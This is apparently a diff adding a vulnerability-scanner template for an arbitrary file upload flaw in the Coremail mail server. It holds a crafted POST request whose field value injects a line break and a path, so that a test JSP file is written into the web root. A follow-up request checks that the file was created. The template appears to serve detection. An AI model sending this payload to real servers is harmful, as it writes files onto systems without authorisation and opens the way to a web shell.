@@ -1,0 +1,31 @@
+id: coremail-arbitrary-file-upload
+info:
+  name: Coremail Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects an arbitrary file upload vulnerability in Coremail, allowing attackers to upload malicious files to the server.
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /webinst/action.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        func=checkserver&webServerName=127.0.0.1:6132/%0d@/home/coremail/web/webapp/justtest.jsp%20WOSHIHAHAHA
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /coremail/justtest.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "WOSHIHAHAHA"
+        part: body
